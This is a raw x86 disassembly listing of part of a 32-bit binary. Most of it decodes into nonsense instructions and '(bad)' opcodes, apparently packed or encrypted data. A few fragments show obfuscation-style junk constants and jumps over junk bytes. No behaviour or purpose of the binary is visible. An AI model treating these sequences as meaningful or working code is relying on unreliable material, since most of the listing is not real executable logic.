  4120e1:	dec    esp
  4120e2:	pop    ebp
  4120e3:	inc    eax
  4120e4:	addr16 jbe 0x412152
  4120e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120e8:	push   ss
  4120e9:	sub    ecx,DWORD PTR ds:0x255e22dc
  4120ef:	lds    esp,FWORD PTR [edx]
  4120f1:	mov    WORD PTR [edi],es
  4120f3:	add    eax,0xe2270a6a
  4120f8:	imul   edx,DWORD PTR [esi],0x8410a1c4
  4120fe:	loope  0x41210c
  412100:	sub    ecx,eax
  412102:	fist   WORD PTR [ebx-0x16]
  412105:	pop    ebx
  412106:	xor    BYTE PTR [ecx],0xa5
  412109:	jb     0x412185
  41210b:	adc    ch,dl
  41210d:	push   0xffffff8d
  41210f:	push   esp
  412110:	dec    ecx
  412111:	adc    edi,edx
  412113:	pushf  
  412114:	gs ins DWORD PTR es:[edi],dx
  412116:	fist   DWORD PTR [edx-0x34f24d73]
  41211c:	and    BYTE PTR [edi+esi*8],ah
  41211f:	call   esi
  412121:	cld    
  412122:	lds    esp,FWORD PTR [ecx+0xb4a9f10]
  412128:	add    DWORD PTR [ebx],ebx
  41212a:	mov    eax,ds:0xa3c72814
  41212f:	mov    esi,0x491e5dc1
  412134:	adc    eax,0x7fc2859d
  412139:	mov    esp,0x815c9c6a
  41213e:	and    DWORD PTR [ebp+0x3e],0x76
  412142:	mov    gs,WORD PTR [ecx+ebp*2-0x5fff32e6]
  412149:	push   eax
  41214a:	mov    ds:0x2bfcca46,eax
  41214f:	push   edx
  412150:	mov    fs,WORD PTR [edi-0x3d]
  412153:	jge    0x4120d5
  412155:	jae    0x41218d
  412157:	inc    eax
  412158:	pusha  
  412159:	mov    cl,0xfb
  41215b:	shl    DWORD PTR [ebp+0xc],1
  41215e:	imul   edi,DWORD PTR [eax+0x73],0xe9f6d546
  412165:	jne    0x4121bb
  412167:	pushw  ds
  412169:	push   0x3f
  41216b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41216c:	mul    cl
  41216e:	ret    
  41216f:	aad    0xe8
  412171:	jae    0x412124
  412173:	mov    esi,0xb353d823
  412178:	aam    0x5
  41217a:	test   edx,ebp
  41217c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41217d:	adc    BYTE PTR [edx-0x27],bh
  412180:	in     eax,dx
  412181:	shl    BYTE PTR [ecx-0x7e],cl
  412184:	sti    
  412185:	dec    ecx
  412186:	shr    BYTE PTR [edx-0x58d2b6b7],cl
  41218c:	ficomp DWORD PTR ds:[ebp+eiz*8-0xfa3627b]
  412194:	enter  0x946f,0x1e
  412198:	add    cl,BYTE PTR [ecx+0x3da62e21]
  41219e:	xor    BYTE PTR [ecx-0x7d],bh
  4121a1:	mov    WORD PTR [ecx+0x4f],ds
  4121a4:	in     al,0x80
  4121a6:	dec    esi
  4121a7:	out    0x62,al
  4121a9:	pop    edi
  4121aa:	push   ds
  4121ab:	das    
  4121ac:	cdq    
  4121ad:	sub    DWORD PTR [esi],0x5ac3cdce
  4121b3:	mov    dh,0x51
  4121b5:	vpmulhuw ymm4,ymm4,YMMWORD PTR [ebx+eax*8-0x36]
  4121bb:	lock std 
  4121bd:	call   0x89a6:0xf84356ab
  4121c4:	mov    ebx,0x79c5ec04
  4121c9:	stos   DWORD PTR es:[edi],eax
  4121ca:	jmp    0x412184
  4121cc:	shr    eax,1
  4121ce:	inc    eax
  4121cf:	sub    DWORD PTR [edi-0x782fcc71],esp
  4121d5:	xchg   ebx,eax
  4121d6:	pop    ecx
  4121d7:	mov    bh,0x3e
  4121d9:	sub    al,0xa4
  4121db:	jmp    0x19c4:0xfac766e4
  4121e2:	sbb    eax,0xdabedcbf
  4121e7:	test   eax,0x3bba5ddb
  4121ec:	pop    ecx
  4121ed:	adc    BYTE PTR [edx],dh
  4121ef:	or     ebp,ecx
  4121f1:	mov    cl,0x9b
  4121f3:	lods   eax,DWORD PTR ds:[esi]
  4121f4:	rep outs dx,BYTE PTR ds:[esi]
  4121f6:	xchg   esp,eax
  4121f7:	and    eax,0xd5cce913
  4121fc:	call   0x96da:0xed785871
  412203:	push   esi
  412204:	inc    esp
  412205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412206:	(bad)  
  412207:	(bad)  
  412209:	jmp    0x412233
  41220b:	out    dx,al
  41220c:	mov    dl,0x68
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225ac
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	and    BYTE PTR ds:0x60febcd5,bh
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	popa   
  4122ae:	iret   
  4122af:	sti    
  4122b0:	loope  0x412277
  4122b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b3:	xchg   edx,eax
  4122b4:	mov    ebp,0x79826b49
  4122b9:	push   esp
  4122ba:	push   0x9cc8c993
  4122bf:	push   eax
  4122c0:	mov    al,BYTE PTR [ecx-0x32]
  4122c3:	ret    
  4122c4:	jae    0x412258
  4122c6:	fistp  DWORD PTR [ebp-0x1353bb6e]
  4122cc:	lahf   
  4122cd:	(bad)  
  4122cf:	mov    bh,0xd3
  4122d1:	sbb    al,0x7f
  4122d3:	add    al,0xf7
  4122d5:	xchg   ecx,eax
  4122d6:	cmp    esi,0xffffffef
  4122d9:	repnz lock in al,dx
  4122dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122dd:	sti    
  4122de:	imul   ebx,esp,0x5bbf03a5
  4122e4:	mov    ebp,0xbe783958
  4122e9:	cdq    
  4122ea:	call   0xf10dbc02
  4122ef:	jecxz  0x4122e3
  4122f1:	push   edx
  4122f2:	cli    
  4122f3:	(bad)  [eax-0x71]
  4122f6:	mov    edi,0x9332ca68
  4122fb:	and    DWORD PTR [ecx+0x1b3a6c9f],eax
  412301:	gs dec ebx
  412303:	add    al,0x4a
  412305:	or     edx,0x9899b943
  41230b:	(bad)  
  41230c:	data16 add BYTE PTR [esi-0x1b5e4509],0x1c
  412314:	mov    ebx,0xc0b65685
  412319:	and    eax,0x5ae6cf4a
  41231e:	mov    ebx,0xb806c0b2
  412323:	sbb    esp,DWORD PTR [eax-0x294675cd]
  412329:	xchg   ecx,eax
  41232a:	aad    0x3c
  41232c:	call   0xc2495034
  412331:	cmp    dl,BYTE PTR [ebx]
  412333:	inc    eax
  412334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412335:	push   edx
  412336:	lea    ebx,[edi]
  412338:	cmp    ebp,edx
  41233a:	pop    esi
  41233b:	inc    ecx
  41233c:	add    DWORD PTR ds:0xeb7d0964,edi
  412342:	ffreep st(7)
  412344:	into   
  412345:	and    BYTE PTR [esi],cl
  412347:	mov    dl,0x14
  412349:	mov    eax,0x39d92618
  41234e:	push   0xa29ef95c
  412353:	mov    DWORD PTR [eax+eiz*1],ebx
  412356:	fisttp DWORD PTR [edi-0x5c]
  412359:	sub    edx,ebp
  41235b:	lahf   
  41235c:	and    eax,0x4861cb0f
  412361:	(bad)  
  412362:	xchg   DWORD PTR [edx],edi
  412364:	iret   
  412365:	leave  
  412366:	xchg   ecx,eax
  412367:	outs   dx,BYTE PTR ds:[esi]
  412368:	inc    edx
  412369:	jle    0x4123c7
  41236b:	enter  0x23db,0xa6
  41236f:	cmp    eax,DWORD PTR [esi]
  412371:	ss hlt 
  412373:	popa   
  412374:	in     eax,0x97
  412376:	clc    
  412377:	xchg   ebp,eax
  412378:	push   ebp
  412379:	cmp    bl,cl
  41237b:	adc    DWORD PTR [ebx-0x54],ecx
  41237e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41237f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412381:	push   0xff1e9ae5
  412386:	push   edi
  412387:	bndstx [ecx-0x72015648],bnd1
  41238e:	in     al,dx
  41238f:	gs xor al,0xbf
  412392:	push   es
  412393:	xchg   ecx,eax
  412394:	rcl    esp,0x8b
  412397:	lods   al,BYTE PTR ds:[esi]
  412398:	and    al,0xeb
  41239a:	(bad)  
  41239b:	cmp    DWORD PTR [edi-0x2513f92a],edx
  4123a1:	fwait
  4123a2:	(bad)  
  4123a3:	fstp   QWORD PTR [ecx+eiz*4+0x1f4e04bd]
  4123aa:	sub    al,BYTE PTR ss:[ebx+0x54]
  4123ae:	mov    cs,ebx
  4123b0:	inc    ebp
  4123b1:	(bad)  
  4123b2:	hlt    
  4123b3:	(bad)  [ebx-0x7a]
  4123b6:	fdiv   QWORD PTR es:[ebp+0x15435690]
  4123bd:	icebp  
  4123be:	fld    TBYTE PTR [eax-0x4c]
  4123c1:	stos   DWORD PTR es:[edi],eax
  4123c2:	mov    ecx,0xb032634a
  4123c7:	xlat   BYTE PTR ds:[ebx]
  4123c8:	inc    esp
  4123c9:	daa    
  4123ca:	fistp  WORD PTR [ecx]
  4123cc:	jg     0x412396
  4123ce:	add    esp,DWORD PTR [edx+0x1c399bae]
  4123d4:	lea    ecx,[esi-0x45f9c733]
  4123da:	xchg   edx,eax
  4123db:	xchg   esi,eax
  4123dc:	(bad)  
  4123de:	les    esi,FWORD PTR [ecx-0x428eb222]
  4123e4:	or     cl,bh
  4123e6:	sub    al,0x95
  4123e8:	pushf  
  4123e9:	sub    eax,0x13aa5d59
  4123ee:	push   0xfffffffd
  4123f0:	add    DWORD PTR [eax-0x26],ecx
  4123f3:	mov    dh,0xd1
  4123f5:	pop    ebx
  4123f6:	lahf   
  4123f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123f8:	ins    BYTE PTR es:[edi],dx
  4123f9:	lahf   
  4123fa:	dec    esp
  4123fb:	inc    ebx
  4123fc:	mov    ebp,0x2f622aff
  412401:	out    0xfa,al
  412403:	mov    bh,0x75
  412405:	xchg   DWORD PTR [esi-0x56ad6def],ebp
  41240b:	stos   BYTE PTR es:[edi],al
  41240c:	push   eax
  41240d:	add    dl,al
  41240f:	enter  0x349,0x4f
  412413:	adc    eax,0x64dc793e
  412418:	loope  0x4123e8
  41241a:	cmp    BYTE PTR [eax+ecx*1-0x6fa25673],cl
  412421:	sbb    DWORD PTR ds:0xaca008f8,edi
  412427:	jecxz  0x412461
  412429:	jmp    FWORD PTR [edx-0x36]
  41242c:	fs mov al,0xf7
  41242f:	aas    
  412430:	mov    al,0x64
  412432:	lds    esi,FWORD PTR [ebx-0x5d8c6d5a]
  412438:	cmp    BYTE PTR [eax-0x3d],dl
  41243b:	ds mov dh,0xa1
  41243e:	out    0xe5,eax
  412440:	mov    eax,?
  412442:	dec    ebp
  412443:	and    al,0x76
  412445:	add    eax,0xc619157f
  41244a:	(bad)  
  41244b:	pop    edx
  41244c:	xchg   cl,dh
  41244e:	rol    BYTE PTR [edx-0x6f16b32d],0xac
  412455:	xchg   esp,eax
  412456:	les    ecx,FWORD PTR [ecx]
  412458:	mov    eax,0xb1b80f0b
  41245d:	sbb    BYTE PTR [ebx+0x3c],al
  412460:	sbb    bh,BYTE PTR [ebx]
  412462:	push   0xddf2ad03
  412467:	jae    0x412474
  412469:	mov    BYTE PTR [esi-0x14072b6b],bl
  41246f:	lock inc ecx
  412471:	leave  
  412472:	stos   DWORD PTR es:[edi],eax
  412473:	into   
  412474:	js     0x412497
  412476:	adc    DWORD PTR [edx-0x63],eax
  412479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41247a:	test   al,0xd7
  41247c:	les    eax,FWORD PTR ds:0x687205e8
  412482:	shl    BYTE PTR [ebx],cl
  412484:	push   0xd002eb3a
  412489:	and    eax,0x4dda0bd2
  41248e:	fisubr DWORD PTR [esi+0x61]
  412491:	inc    ch
  412493:	xacquire xchg BYTE PTR ds:0x1f4fcc4b,bh
  41249a:	jg     0x4124e0
  41249c:	call   0x66669e0c
  4124a1:	mov    ds:0x80ddba11,al
  4124a6:	adc    DWORD PTR [ebx+0x1a4cc6ae],esi
  4124ac:	cwde   
  4124ad:	loop   0x4124aa
  4124af:	mov    al,0x61
  4124b1:	out    0x7b,eax
  4124b3:	cwde   
  4124b4:	jle    0x412448
  4124b6:	es nop
  4124b8:	sub    BYTE PTR [esi],cl
  4124ba:	jmp    0x4124a4
  4124bc:	test   BYTE PTR [eax],dl
  4124be:	out    0x82,eax
  4124c0:	lods   eax,DWORD PTR ds:[esi]
  4124c1:	xchg   ebp,eax
  4124c2:	(bad)  
  4124c3:	aad    0x80
  4124c5:	adc    BYTE PTR [ebx],dh
  4124c7:	nop
  4124c8:	jae    0x41253c
  4124ca:	in     eax,dx
  4124cb:	les    edi,FWORD PTR [ecx-0x5c28686d]
  4124d1:	add    eax,0xb9f314f8
  4124d6:	mov    ebp,0x72c50997
  4124db:	xchg   esp,eax
  4124dc:	sbb    BYTE PTR [ecx-0x33],cl
  4124df:	or     DWORD PTR [ebx*4+0x211b7956],ebp
  4124e6:	fsub   DWORD PTR [esi+0x7]
  4124e9:	or     eax,eax
  4124eb:	(bad)  
  4124ec:	and    BYTE PTR [edx],ch
  4124ee:	adc    eax,0x70b36b6c
  4124f3:	pop    eax
  4124f4:	cmp    bl,BYTE PTR [ebx]
  4124f6:	call   0xc59e:0x1a8cfa75
  4124fd:	retf   
  4124fe:	xor    ebp,esi
  412500:	add    BYTE PTR [edx],bl
  412502:	scas   eax,DWORD PTR es:[edi]
  412503:	test   DWORD PTR ds:0xf113d003,esp
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x42202e
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x41253d
  412538:	cmp    eax,edi
  41253a:	jl     0x412593
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	psubusw mm2,mm2
  412546:	loopne 0x4125a2
  412548:	lds    edi,FWORD PTR [ebp-0x3d]
  41254b:	test   al,0xb2
  41254d:	fwait
  41254e:	jae    0x41250b
  412550:	mov    al,ds:0x6e442f07
  412555:	jmp    0x4125ad
  412557:	mov    ?,WORD PTR [ebx]
  412559:	xchg   ecx,eax
  41255a:	add    al,0xc4
  41255c:	push   0x6c
  41255e:	out    dx,al
  41255f:	xchg   ebp,eax
  412560:	int    0x7d
  412562:	xchg   ebx,eax
  412563:	pop    edi
  412564:	jmp    0x412559
  412566:	aaa    
  412567:	add    bh,BYTE PTR [ecx-0x409d66a1]
  41256d:	out    0x4a,al
  41256f:	fist   WORD PTR [edx-0x12d2cbd2]
  412575:	xchg   edx,eax
  412576:	fcmovnbe st,st(6)
  412578:	jg     0x41253e
  41257a:	and    al,0x86
  41257c:	pop    es
  41257d:	(bad)  
  41257e:	mov    al,ds:0x70be7a60
  412583:	jmp    0x4125aa
  412585:	adc    esi,DWORD PTR [ebx]
  412587:	pop    ebx
  412588:	dec    edx
  412589:	and    eax,0x36b59332
  41258e:	inc    eax
  41258f:	mov    ds:0x32c6dae,eax
  412594:	cmp    DWORD PTR [ecx+0xad23e89],0xa3ccf64
  41259e:	mov    esi,0xb3af580b
  4125a3:	xlat   BYTE PTR ds:[ebx]
  4125a4:	dec    edx
  4125a5:	mov    ecx,0x382e72ad
  4125aa:	push   edi
  4125ab:	dec    esi
  4125ac:	rcl    BYTE PTR [ebp-0x6fd7f175],0x43
  4125b3:	mov    ecx,0x8fe3329c
  4125b8:	sbb    ch,bl
  4125ba:	mov    cs,WORD PTR [ecx+ebx*1+0x7309f9b1]
  4125c1:	sti    
  4125c2:	stos   DWORD PTR es:[edi],eax
  4125c3:	push   eax
  4125c4:	inc    edx
  4125c5:	stos   DWORD PTR es:[edi],eax
  4125c6:	mov    BYTE PTR [ebx],bh
  4125c8:	into   
  4125c9:	mov    es,WORD PTR [esi]
  4125cb:	mov    ah,0x55
  4125cd:	add    BYTE PTR [edx],cl
  4125cf:	out    0x6e,al
  4125d1:	jo     0x412622
  4125d3:	cmp    eax,0xf1826fa6
  4125d8:	test   al,0xfa
  4125da:	sub    DWORD PTR [eax+0x68a49c66],0x1f
  4125e1:	push   0xffffff8f
  4125e3:	push   0x91f0939b
  4125e8:	xchg   ebp,eax
  4125e9:	push   ecx
  4125ea:	loope  0x41257a
  4125ec:	in     al,0xf4
  4125ee:	mov    ch,0x35
  4125f0:	add    BYTE PTR [edx],dl
  4125f2:	mov    ah,0x1e
  4125f4:	adc    bh,BYTE PTR [ebx-0x71e248bb]
  4125fa:	stc    
  4125fb:	pop    ebx
  4125fc:	nop
  4125fd:	stos   BYTE PTR es:[edi],al
  4125fe:	test   DWORD PTR [ecx],ecx
  412600:	jle    0x4125fd
  412602:	dec    eax
  412603:	pop    ecx
  412604:	test   DWORD PTR [eax+0x75],0xe5037c36
  41260b:	pop    esp
  41260c:	das    
  41260d:	mov    esp,0xa23e4568
  412612:	inc    ecx
  412613:	lods   al,BYTE PTR ds:[esi]
  412614:	jmp    0x7b90:0xd8e40251
  41261b:	lahf   
  41261c:	push   0x65196437
  412621:	fld    DWORD PTR [ecx+0x76e456c9]
  412627:	xlat   BYTE PTR ds:[ebx]
  412628:	sub    al,0x4a
  41262a:	jnp    0x4125d9
  41262c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41262d:	ins    BYTE PTR es:[edi],dx
  41262e:	add    DWORD PTR [ecx-0x2588a7ad],ebp
  412634:	(bad)  
  412635:	dec    edi
  412636:	imul   esi,DWORD PTR [edi+ebx*1+0x45],0x93599329
  41263e:	push   esp
  41263f:	xchg   BYTE PTR [edi+0x6dfcaf5d],bl
  412645:	mov    edx,0x73c8a4ba
  41264a:	dec    ecx
  41264b:	cwde   
  41264c:	pop    edx
  41264d:	jg     0x412664
  41264f:	or     al,0xf8
  412651:	cmp    eax,0xa6fa7e56
  412656:	fisubr WORD PTR [edx-0xf818343]
  41265c:	outs   dx,DWORD PTR ds:[esi]
  41265d:	xchg   ecx,eax
  41265e:	icebp  
  41265f:	mov    al,0x58
  412661:	dec    esp
  412662:	es (bad) 
  412664:	call   DWORD PTR [ebp-0x502097c1]
  41266a:	mov    dl,0x51
  41266c:	lds    esp,FWORD PTR [ecx-0x56]
  41266f:	sbb    ebx,eax
  412671:	shl    BYTE PTR [edi],0xc
  412674:	adc    edi,DWORD PTR [eax]
  412676:	clc    
  412677:	xchg   bh,bl
  412679:	push   eax
  41267a:	icebp  
  41267b:	pop    ebx
  41267c:	push   ebp
  41267d:	xchg   edi,eax
  41267e:	add    esp,edi
  412680:	and    edi,edi
  412682:	sbb    esi,esp
  412684:	fstp   DWORD PTR ds:0xacc522d9
  41268a:	lods   al,BYTE PTR ds:[esi]
  41268b:	xor    ebp,DWORD PTR [edx+ebp*8-0x5d]
  41268f:	inc    esp
  412690:	scas   eax,DWORD PTR es:[edi]
  412691:	out    dx,eax
  412692:	test   esp,0xa47ad622
  412698:	mov    edi,DWORD PTR ds:0xc5b8bb20
  41269e:	ja     0x412695
  4126a0:	aaa    
  4126a1:	(bad)  
  4126a2:	jno    0x41265e
  4126a4:	mov    esp,0x464b31d7
  4126a9:	call   0x6ea:0xe81e95dc
  4126b0:	push   edi
  4126b1:	inc    edi
  4126b2:	int3   
  4126b3:	es scas eax,DWORD PTR es:[edi]
  4126b5:	adc    al,0x26
  4126b7:	adc    BYTE PTR [edi+0x25c4c52d],0x80
  4126be:	sbb    BYTE PTR [ecx],dl
  4126c0:	jle    0x412726
  4126c2:	mov    bl,0xd8
  4126c4:	xchg   DWORD PTR [ebx+0x35],eax
  4126c7:	inc    edx
  4126c8:	cmp    bl,ah
  4126ca:	push   cs
  4126cb:	pop    ebp
  4126cc:	or     DWORD PTR [esi+0x28bd69a8],edx
  4126d2:	out    dx,al
  4126d3:	lahf   
  4126d4:	jae    0x412684
  4126d6:	xor    ch,BYTE PTR [ebp+0x33]
  4126d9:	in     eax,0x6a
  4126db:	out    0x3,al
  4126dd:	(bad)  
  4126de:	stc    
  4126df:	pop    edx
  4126e0:	ficomp DWORD PTR fs:[edx+0x27]
  4126e4:	fs sbb esp,ebp
  4126e7:	lahf   
  4126e8:	inc    ebp
  4126e9:	daa    
  4126ea:	mov    bl,0xda
  4126ec:	inc    BYTE PTR [ecx+esi*4-0x1d65d0e5]
  4126f3:	cmp    DWORD PTR [ebx-0x16],ecx
  4126f6:	loop   0x4126c9
  4126f8:	daa    
  4126f9:	jns    0x4126d0
  4126fb:	fld    DWORD PTR [esi+esi*1+0xbd09cac]
  412702:	repnz fild DWORD PTR [edi]
  412705:	fstp   DWORD PTR [eax]
  412707:	xor    eax,0xb506f58d
  41270c:	arpl   WORD PTR [ebx+0x3f],cx
  41270f:	cmp    BYTE PTR ds:0xe76a1aa8,ch
  412715:	je     0x41274d
  412717:	ficom  WORD PTR [ebx+0x19fb44dd]
  41271d:	sub    BYTE PTR [ebx-0x6d24e9e5],bl
  412723:	mov    esp,0xb24872ec
  412728:	xor    al,0x6a
  41272a:	mov    ebx,0x5db0d601
  41272f:	mov    ds:0xbcf63f36,eax
  412734:	inc    ebp
  412735:	add    edx,DWORD PTR [ebx+0x7984ba6b]
  41273b:	iret   
  41273c:	je     0x412794
  41273e:	fistp  WORD PTR [esi+ecx*4]
  412741:	lea    esi,[eax]
  412743:	int    0x74
  412745:	xchg   eax,edx
  412747:	pop    edi
  412748:	xlat   BYTE PTR ds:[ebx]
  412749:	in     eax,dx
  41274a:	mov    cl,0xa0
  41274c:	cdq    
  41274d:	repnz clc 
  41274f:	es div dl
  412752:	iret   
  412753:	ss icebp 
  412755:	xor    BYTE PTR [esp+eax*8+0x7e],al
  412759:	sahf   
  41275a:	cwde   
  41275b:	ds ja  0x412713
  41275e:	mov    cl,0x2c
  412760:	xchg   edi,eax
  412761:	repnz adc DWORD PTR [ecx+0x1d2aeec2],ecx
  412768:	dec    eax
  412769:	pop    ebp
  41276a:	loop   0x4127d8
  41276c:	scas   eax,DWORD PTR es:[edi]
  41276d:	in     al,dx
  41276e:	push   0x72
  412770:	dec    esi
  412771:	imul   edi,eax,0x7
  412774:	popa   
  412775:	mov    edx,ds
  412777:	lahf   
  412778:	sbb    BYTE PTR [edi-0x53],ah
  41277b:	popf   
  41277c:	jmp    0xf308174a
  412781:	enter  0x1d93,0xba
  412785:	sub    BYTE PTR [ebx+eax*4-0x75],bh
  412789:	mov    ebp,0x73c8def7
  41278e:	xchg   esp,eax
  41278f:	cli    
  412790:	rcr    DWORD PTR [ebp+0x3d],1
  412793:	and    al,0x63
  412795:	(bad)  
  412797:	cwde   
  412798:	or     al,0x9f
  41279a:	fstp   QWORD PTR [ebx]
  41279c:	ret    0x158b
  41279f:	lods   al,BYTE PTR ds:[esi]
  4127a0:	and    eax,0xf6330042
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225ac
  4127d5:	mov    ds:0x4225b4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xb0ad94c4
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [eax],dl
  4128b3:	icebp  
  4128b4:	pop    esi
  4128b5:	xor    esp,eax
  4128b7:	fbld   TBYTE PTR [eax]
  4128b9:	jle    0x412935
  4128bb:	aam    0x17
  4128bd:	sbb    ecx,DWORD PTR [edi-0x7be4c4a9]
  4128c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c4:	(bad)  
  4128c5:	loopne 0x412943
  4128c7:	jb     0x412879
  4128c9:	retf   
  4128ca:	mov    cl,0xb0
  4128cc:	xchg   esp,eax
  4128cd:	jmp    0x2077:0x488e7dac
  4128d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128d5:	(bad)  
  4128d6:	mov    dl,0xed
  4128d8:	pop    esp
  4128d9:	dec    edx
  4128da:	clc    
  4128db:	add    al,0x6
  4128dd:	aas    
  4128de:	dec    eax
  4128df:	arpl   WORD PTR [ebx-0x204db836],di
  4128e5:	add    dh,BYTE PTR [eax-0x40]
  4128e8:	jp     0x412882
  4128ea:	ins    BYTE PTR es:[edi],dx
  4128eb:	xor    eax,0xfdfe3603
  4128f0:	pop    ds
  4128f1:	mov    fs,WORD PTR [edi]
  4128f3:	xchg   BYTE PTR [edi+0x52],bh
  4128f6:	dec    ebx
  4128f7:	push   esi
  4128f8:	xor    esi,DWORD PTR [ecx-0x4e]
  4128fb:	(bad)  
  4128fc:	(bad)  
  4128fe:	pop    es
  4128ff:	lods   eax,DWORD PTR ds:[esi]
  412900:	call   0xd50d:0x51002519
  412907:	jbe    0x412938
  412909:	adc    DWORD PTR [edi+0x19dfe9d4],esp
  41290f:	repz rcr dl,1
  412912:	jno    0x412991
  412914:	add    al,0x97
  412916:	(bad)  
  412918:	ror    dh,cl
  41291a:	ja     0x4128aa
  41291c:	add    bl,ch
  41291e:	inc    esp
  41291f:	mov    dh,0x55
  412921:	push   cs
  412922:	ins    DWORD PTR es:[edi],dx
  412923:	out    dx,al
  412924:	pushf  
  412925:	ja     0x4128ef
